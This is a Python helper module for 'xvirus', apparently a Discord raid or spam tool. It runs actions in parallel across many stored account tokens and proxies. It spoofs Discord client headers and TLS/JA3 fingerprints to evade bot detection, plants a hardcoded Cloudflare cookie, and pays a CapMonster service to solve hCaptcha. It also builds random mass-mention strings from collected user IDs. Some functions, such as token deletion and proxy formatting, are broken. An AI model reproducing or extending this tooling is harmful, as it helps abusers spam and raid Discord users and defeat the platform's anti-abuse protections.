import base64
import ctypes
import json
import os
import random
import re
import sys
import time
import types
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime, timedelta
import httpx
import requests
import string
from colorama import Fore
from capmonster_python import capmonster, HCaptchaTask
import tls_client

THIS_VERSION = "1.0.0"

class Config:
    def __init__(self):
        self.folder_path = os.path.join(os.getenv('LOCALAPPDATA'), 'xvirus_config')
        os.makedirs(self.folder_path, exist_ok=True)
        self.config_file = os.path.join(self.folder_path, 'config.json')
        self.config_data = self._load('config.json')

        for file_name in ['xvirus_tokens', 'xvirus_proxies', 'xvirus_usernames', 'xvirus_ids']:
            file_path = os.path.join(self.folder_path, file_name)
            if not os.path.exists(file_path):
                with open(file_path, 'w') as file:
                    pass

    def _load(self, file_name):
        file_path = os.path.join(self.folder_path, file_name)
        try:
            with open(file_path, 'r', encoding='utf-8') as file:
                return json.load(file)
        except FileNotFoundError:
            return {}
        except json.JSONDecodeError as e:
            print(f"JSON decoding error: {e}")
            return {}

    def _save(self, file_name, data):
        file_path = os.path.join(self.folder_path, file_name)
        with open(file_path, 'w') as file:
            json.dump(data, file, indent=4)

    def _set(self, key, value):
        self.config_data[key] = value
        self._save('config.json', self.config_data)

    def _get(self, key, default=None):
        return self.config_data.get(key, default) if default is not None else self.config_data.get(key)


    def _remove(self, key):
        if key in self.config_data:
            del self.config_data[key]
            self._save('config.json', self.config_data)
    
    def _reset(self):
        self.config_data = {}
        self._save('config.json', self.config_data)

    def add(self, file_name, data):
        if file_name not in ['xvirus_tokens', 'xvirus_proxies', 'xvirus_usernames', 'xvirus_ids']:
            raise ValueError(f"Error: {file_name} is not a valid file name.")
        
        file_path = os.path.join(self.folder_path, file_name)
        with open(file_path, 'a') as file:
            file.write(data + '\n')

    def read(self, file_name):
        if file_name not in ['xvirus_tokens', 'xvirus_proxies', 'xvirus_usernames', 'xvirus_ids']:
            raise ValueError(f"Error: {file_name} is not a valid file name.")
        
        file_path = os.path.join(self.folder_path, file_name)
        try:
            with open(file_path, 'r') as file:
                return file.read().strip()
        except FileNotFoundError:
            raise FileNotFoundError(f"Error: {file_name} not found.")
    
    def reset(self, file_name):
        if file_name not in ['xvirus_tokens', 'xvirus_proxies', 'xvirus_usernames', 'xvirus_ids']:
            raise ValueError(f"Error: {file_name} is not a valid file name.")
        
        file_path = os.path.join(self.folder_path, file_name)
        try:
            with open(file_path, 'w') as file:
                pass
        except Exception as e:
            print(f"An error occurred while resetting the {file_name} file: {e}")

config = Config()

class Output:
    def __init__(self, level, config, token=None):
        self.level = level
        self.config = config
        self.token = token
        self.color_map = {
            "info": (Fore.BLUE, "<~>"),
            "bad": (Fore.RED, "<!>"),
            "good": (Fore.GREEN, "<*>")
        }

    def should_hide(self):
        return not self.config._get('debug_mode', True)

    def hide_token(self, text):
        if self.should_hide() and self.token:
            token_length = len(self.token)
            if token_length >= 10:
                censored_part = '*' * 10
                text = text.replace(self.token[-10:], censored_part)
        return text

    def notime(self, *args, **kwargs):
        color, text = self.color_map.get(self.level, (Fore.LIGHTWHITE_EX, self.level))
        time_now = datetime.now().strftime("%H:%M:%S")

        base = f"{color}{text.upper()}"
        for arg in args:
            arg = self.hide_token(arg)
            base += f" {arg}"
        if kwargs:
            for key, value in kwargs.items():
                value = self.hide_token(value)
                base += f" {key}={value}"
        print(base)

    def log(self, *args, **kwargs):
        color, text = self.color_map.get(self.level, (Fore.LIGHTWHITE_EX, self.level))
        time_now = datetime.now().strftime("%H:%M:%S")

        base = f"{Fore.RED}│{Fore.BLUE}{time_now}{Fore.RED}│ {color}{text.upper()}"
        updated_args = []

        for arg in args:
            arg = self.hide_token(arg)
            updated_args.append(arg)

        for arg in updated_args:
            base += f" {arg}"

        if kwargs:
            for key, value in kwargs.items():
                value = self.hide_token(value)
                base += f" {key}={value}"
        print(base)

    @staticmethod
    def PETC():
        config = Config()
        Output("info", config).notime(f"Press ENTER to continue")
        input()
    
    def SetTitle(_str):
        text = str(requests.get("https://cloud.xvirus.lol/title.txt").text)
        system = os.name
        if system == 'nt':
            ctypes.windll.kernel32.SetConsoleTitleW(f"{_str} - {text}")
        else:
            pass
 
class DiscordProps:
    @staticmethod
    def get_build_number():
        scripts = re.compile(r'/assets/.{20}.js', re.I).findall(requests.get("https://discord.com/app", headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0'}).text)
        scripts.reverse()
        for v in scripts:
            content = requests.get(f"https://discord.com{v}", headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0'}).content.decode()
            if content.find("build_number:\"") != -1:
                return re.compile(r"build_number:\"(.*?)\"", re.I).findall(content)[0]
    user_agents = [
        'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9011 Chrome/91.0.4472.164 Electron/13.6.6 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9016 Chrome/108.0.5359.215 Electron/22.3.12 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0'
    ]
    lang = [
        "de,de-DE;q=0.9",
        "en,en-US;q=0.9",
        "es,es-ES;q=0.9",
        "fr,fr-FR;q=0.9",
        "ja;q=0.9",
        "ru,ru-RU;q=0.9",
        "pt-BR;q=0.9",
        "tr;q=0.9",
        "ar,ar-SA;q=0.9",
        "zh,zh-CN;q=0.9"
    ]
    brands = [
        """Not?A_Brand";v="8", "Chromium";v="108""",
        """Not?A_Brand";v="8", "Firefox";v="92""",
        """Not?A_Brand";v="8", "Safari";v="15""",
        """Edge";v="96", "Chromium";v="108""",
        """Brave";v="1.31", "Chromium";v="108""",
        """Opera";v="88", "Chromium";v="108""",
        """Internet Explorer";v="11", "Chromium";v="108"""
    ]
    channels = [
        "ptb", 
        "canary", 
        "stable"
    ] 
    times = [
        "Europe/Berlin",
        "America/New_York",
        "Asia/Tokyo",
        "Australia/Sydney",
        "America/Los_Angeles",
        "Africa/Cairo",
        "Asia/Dubai",
        "America/Mexico_City",
        "Pacific/Auckland",
        "America/Chicago"
    ]
    zone = random.choice(times)
    channels = ["ptb", "canary", "stable"] 
    user_agent = random.choice(user_agents)
    language = random.choice(lang)
    channel = random.choice(channels)  
    buildNumber = get_build_number()
    x_super_properties = base64.b64encode(json.dumps({
        "os": "Windows",
        "browser": "Discord Client",
        "release_channel": channel,
        "client_version": "1.0.9011",
        "os_version": "10.0.22638",
        "os_arch": "x64",
        "system_locale": "en",
        "client_build_number": buildNumber,
        "native_build_number": 30306,
        "client_version_string": "1.0.9011",
        "os_version_string": "10.0.22638",
        "os_arch_string": "x64"}).encode()).decode()
    
    bypassheaders = {
        'authority': 'discord.com',
        'x-super-properties': x_super_properties,
        'x-discord-locale': 'en',
        'x-debug-options': 'bugReporterEnabled',
        'accept-language': 'en',
        'user-agent': user_agent,
        'content-type': 'application/json',
        'accept': '*/*',
        'origin': 'https://discord.com',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        }
    
    default_headers = {
        'authority': 'discord.com',
        'accept': '*/*',
        'accept-language': language,
        'content-type': 'application/json',
        'origin': 'https://discord.com',
        'referer': 'https://discord.com/',
        'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': user_agent,
        'x-debug-options': 'bugReporterEnabled',
        'x-discord-locale': 'en-US',
        'x-discord-timezone': zone,
        'x-super-properties': x_super_properties,
    }

class Header:
    @staticmethod
    def tls_session() -> tls_client.Session:
        config = Config()
        client = tls_client.Session(
            client_identifier=f"chrome_{random.randint(110, 116)}",
            random_tls_extension_order=True,
            ja3_string="771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,10-23-27-43-13-65281-16-5-45-18-0-11-35-17513-51-21-41,29-23-24,0",
            h2_settings={
                "HEADER_TABLE_SIZE": 65536,
                "MAX_CONCURRENT_STREAMS": 1000,
                "MAX_HEADER_LIST_SIZE": 262144,
                "INITIAL_WINDOW_SIZE": 6291456     
            },
            h2_settings_order=[
                "HEADER_TABLE_SIZE",
                "MAX_CONCURRENT_STREAMS",
                "INITIAL_WINDOW_SIZE",
                "MAX_HEADER_LIST_SIZE"
            ],
            supported_signature_algorithms=[
                "PKCS1WithSHA384",
                "PSSWithSHA512",
                "PKCS1WithSHA512",
                "ECDSAWithP256AndSHA256",
                "PSSWithSHA256",
                "PKCS1WithSHA256",
                "ECDSAWithP384AndSHA384",
                "PSSWithSHA384",
            ],
            supported_versions=["GREASE", "1.3", "1.2"],
            key_share_curves=["GREASE", "X25519"],
            cert_compression_algo="brotli",
            pseudo_header_order=[":method", ":authority", ":scheme", ":path"],
            connection_flow=15663105,
            header_order=["accept", "user-agent", "accept-encoding", "accept-language"]
        )
        if config._get("use_proxies"):
            proxy = ProxyManager.clean_proxy(ProxyManager.random_proxy())
            if isinstance(proxy, str):
                proxy_dict = {
                    "http": f"{ProxyManager.get_proxy_type()}://{proxy}",
                    "https": f"{ProxyManager.get_proxy_type()}://{proxy}"
                }
            elif isinstance(proxy, dict):
                proxy_dict = proxy

            client.proxies = proxy_dict
        
        return client

    @staticmethod
    def get_cookies(session, headers):
        cookies = dict(
            session.get("https://discord.com", headers=headers).cookies
        )

        cookies["__cf_bm"] = (
            "0duPxpWahXQbsel5Mm.XDFj_eHeCKkMo.T6tkBzbIFU-1679837601-0-"
            "AbkAwOxGrGl9ZGuOeBGIq4Z+ss0Ob5thYOQuCcKzKPD2xvy4lrAxEuRAF1Kopx5muqAEh2kLBLuED6s8P0iUxfPo+IeQId4AS3ZX76SNC5F59QowBDtRNPCHYLR6+2bBFA=="
        )
        cookies["locale"] = "en-US"

        return cookies

    @staticmethod
    def get_client(token):
        default_headers = DiscordProps.default_headers.copy()
        default_headers["authorization"] = token

        session = Header.tls_session()
        cookie = Header.get_cookies(session, headers=default_headers)
    
        default_headers["cookie"] = (
            f'__dcfduid={cookie["__dcfduid"]}; '
            f'__sdcfduid={cookie["__sdcfduid"]}; '
            f'__cfruid={cookie["__cfruid"]}; '
            f'__cf_bm={cookie["__cf_bm"]}; '
            f'locale={cookie["locale"]}'
        )
    
        return session, default_headers, cookie

class ProxyManager:
    def get_proxies():
        config = Config()
        f = config.read('xvirus_proxies')
        proxies = f.strip().splitlines()
        proxies = [proxy for proxy in proxies if proxy not in [" ", "", "\n"]]
        return proxies
    
    def random_proxy():
        try:
            return random.choice(ProxyManager.get_proxies())
        except:
            return {}

    def clean_proxy(proxy):
        if isinstance(proxy, str):
            parts = proxy.split(':')
            if '@' in proxy or len(parts) == 2:
                return proxy
            elif len(parts) == 4:
                return f'{parts[2:]}@{parts[:2]}'
            elif '.' in parts[0]:
                return f'{parts[2:]}@{parts[:2]}'
            else:
                return f'{parts[:2]}@{parts[2:]}'
        elif isinstance(proxy, dict):
            http_proxy = proxy.get("http") or proxy.get("https")
            https_proxy = proxy.get("https") or proxy.get("http")
            if http_proxy or https_proxy:
                return {
                    "http://": http_proxy,
                    "https://": https_proxy
                }
            elif proxy in [dict(), {}]:
                return {}
        return proxy
    
    def get_proxy_type():
        config = Config()
        h = config._get("proxy_type", "http")
        if "socks5" in h and "h" in h:
            h = "socks5"
        return h

class TokenManager:
    @classmethod
    def get_tokens(cls):
        config = Config()
        f = config.read('xvirus_tokens')
        tokens = f.strip().splitlines()
        tokens = [token for token in tokens if token not in [" ", "", "\n"]]
        return tokens

    @classmethod
    def custom_path(cls, custom_path):
        try:
            with open(custom_path, 'r') as file:
                tokens = file.read().strip().splitlines()
                tokens = [token for token in tokens if token.strip()]
                return tokens
        except FileNotFoundError:
            Output("bad", config).notime(f"File not found: {custom_path}")
            return None

    @staticmethod
    def OnlyToken(tokenn):
        r = re.compile(r"(.+):(.+):(.+)")
        if r.match(tokenn):
            return tokenn.split(":")[2]
        else:
            token = tokenn
        return token
    
    @classmethod
    def delete_token(cls, token):
        f = Config.read('xvirus_tokens')
        new_f = f.readlines()
        f.seek(0)
        for line in new_f:
            if token not in line:
                f.write(line)
        f.truncate()
    
    @classmethod
    def get_random_token(cls):
        tokens = cls.get_tokens()
        if tokens:
            return random.choice(tokens)
        else:
            return None

class utility:
    def threads(func, args=[], delay=0, thread_amount=None, return_home=True, text=""):
        config = Config()
        try:
            tokens = TokenManager.get_tokens()
            maxine = thread_amount
            
            if thread_amount is None:
                thread_amount = utility.ask(f"Amount Of Threads")
                try:
                    thread_amount = int(thread_amount)
                except ValueError:
                    pass
                
                if not thread_amount:
                    thread_amount = len(tokens)
                
                if thread_amount > len(tokens):
                    thread_amount = len(tokens)
            
            if tokens:
                try:
                    with ThreadPoolExecutor(max_workers=int(thread_amount)) as executor:
                        for token in tokens:
                            try:
                                token = TokenManager.OnlyToken(token)
                                args.append(token)
                                executor.submit(func, *args)
                                args.remove(token)
                                time.sleep(delay)
                                    
                            except Exception as e:
                                Output("error", config).log(f"{Fore.RED}Error: {e}")
                    
                    if maxine is not None:
                        name = " ".join([name.capitalize() for name in func.__name__.split('_')])
                        if return_home:
                            Output.PETC()
                    
                    time.sleep(5)
                    
                    if return_home:
                        Output.PETC()
                except Exception as e:
                    Output("error", config).log(f"{Fore.RED}Error: {e}")
                    if return_home:
                        Output.PETC()
            else:
                Output("error", config).notime(f"No tokens were found in the cache")
                if return_home:
                    Output.PETC()
        except Exception as e:
            Output("error", config).notime(f"{Fore.RED}ERROR: {e}")
            if return_home:
                Output.PETC()

    def rand_str(length:int) -> str:
        return ''.join(random.sample(string.ascii_lowercase+string.digits, length))
    
    def get_guild(invite):
        try:
            result = requests.get(f"https://discord.com/api/v9/invites/{invite}?inputValue={invite}&with_counts=true&with_expiration=true")
            data = result.json()
            if "Unknown Invite" in data.get("message"):
                return None
            return data
        except:
            return None

    def ask(text: str = ""):
        ask = input(f"{Fore.RED}<~> {text}: {Fore.BLUE}")
        return ask
    
    def asknum(num: int = ""):
        ask = input(f"{Fore.RED}<~> {num}: {Fore.BLUE}")
        return ask
    
    def get_random_id(id):
        folder_path = os.path.join(os.getenv('LOCALAPPDATA'), 'xvirus_config')
        file = os.path.join(folder_path, 'xvirus_ids')
        with open(file, "r", encoding="utf8") as f:
            users = [line.strip() for line in f.readlines()]
        randomid = random.sample(users, id)
        return "<@!" + "> <@!".join(randomid) + ">"
    
    def get_ids():
        config = Config()
        f = config.read('xvirus_ids')
        ids = f.strip().splitlines()
        ids = [idd for idd in ids if idd not in [" ", "", "\n"]]
        return ids

class Captcha:
    def solve(url, sitekey, data=None):
        config = Config()
        captchaKey = config._get("captcha_key")
        cap = HCaptchaTask(captchaKey)
        cap.set_user_agent(f"Discord-Android/{DiscordProps.buildNumber};RNA")
        proxy = ProxyManager.random_proxy()
        if proxy:
            proxy_type = ProxyManager.get_proxy_type()
            proxy_parts = proxy.split(':')
            if len(proxy_parts) == 2:
                proxy_address, proxy_port = proxy_parts
                cap.set_proxy(proxy_type, proxy_address, int(proxy_port), proxy_login=None, proxy_password=None)
        if data:
            task = cap.create_task(
                website_url=url,
                website_key=sitekey,
                custom_data=data,
            )
        else:
            task = cap.create_task(
                website_url=url,
                website_key=sitekey,
            )
        result = cap.join_task_result(task)
        return result.get("gRecaptchaResponse")
    
    def getCapBal():
        config = Config()
        key = config._get("captcha_key")
        get_balance_resp = httpx.post(f"https://api.capmonster.cloud/getBalance", json={"clientKey": key}).text
        bal = json.loads(get_balance_resp)["balance"]
        balance = f"${bal}"
        return balance